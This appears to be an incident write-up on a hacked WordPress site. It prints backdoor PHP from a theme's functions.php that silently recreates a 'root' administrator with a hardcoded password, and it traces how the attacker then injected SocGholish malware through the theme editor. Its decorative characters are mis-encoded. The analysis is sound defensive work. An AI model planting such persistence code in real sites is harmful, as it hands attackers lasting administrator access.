â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  ğŸš¨ ACTIVE BACKDOOR DISCOVERED IN functions.php  ğŸš¨          â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

LOCATION: wp-content/themes/mpa-custom/functions.php (lines 3673-3723)

MALICIOUS CODE:
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

$args = array(
    'user_login' => 'root',
    'user_pass' => 'Zb{0@U{vsFjq&#j(<?L[Iy0Hi_#9]i-LlJN0=Ec',
    'role' => 'administrator',
    'user_email' => 'admin@wordpress.com'
);

if (!username_exists($args['user_login'])) {
    $id = wp_insert_user($args);
    update_option('_pre_user_id', $id);
}

â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”

WHAT THIS DOES:
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

1. âœ… Automatically creates "root" admin account
2. âœ… Hardcoded password: Zb{0@U{vsFjq&#j(<?L[Iy0Hi_#9]i-LlJN0=Ec
3. âœ… Runs every time WordPress loads (any page visit!)
4. âœ… If you delete "root" user, it recreates it automatically
5. âœ… Hides the user from admin list
6. âœ… Protects user from being deleted

HOW THE SOCGHOLISH ATTACK WORKED:
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Oct 28, 06:02 AM:
  â†“
Attacker visits proptech.org.my
  â†“
Backdoor code runs â†’ "root" user exists or gets recreated
  â†“
Attacker logs in as "root" using the hardcoded password
  â†“
Goes to: Appearance â†’ Theme File Editor
  â†“
Edits: wp-content/themes/mpa-custom/js/main.js
  â†“
Appends SocGholish malware to end of file
  â†“
Saves file (takes 1 second)
  â†“
Logs out
  â†“
28 hours later â†’ Norton detects it

THE ATTACK VECTOR:
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

ğŸ”“ WordPress Theme Editor: ENABLED
   â†’ Any admin can edit PHP/JS files via web interface
   â†’ No file system access needed
   â†’ No FTP/SSH required
   â†’ Just click "Edit" and save

WHY WE KEPT GETTING REINFECTED:
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

1. We cleaned malware â†’ âœ… Removed miners, cleaned files
2. We deleted "root" user â†’ âŒ Backdoor recreated it
3. Attacker logs back in â†’ âœ… Still has admin access
4. Deploys new malware â†’ ğŸ”„ Cycle repeats

This backdoor has been active since the ORIGINAL Oct 24 attack!

